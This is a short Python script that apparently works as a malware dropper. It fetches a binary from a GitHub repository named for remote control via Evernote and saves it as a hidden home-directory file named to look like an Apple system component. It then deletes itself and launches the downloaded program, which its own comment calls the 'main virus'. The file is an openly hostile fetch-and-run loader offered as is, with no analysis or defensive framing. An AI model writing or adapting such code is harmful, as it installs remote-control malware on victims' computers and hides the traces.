from requests import get
from os.path import expanduser
from os import remove
from subprocess import Popen as subproc

filename = "com.apple.com.user.core"

# download main virus
open(f"{expanduser('~')}/.{filename}", 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/Remote-Control-With-Evernote/main/main", allow_redirects=True).content)

remove(__file__)

subproc([f"{expanduser('~')}/.{filename}"])
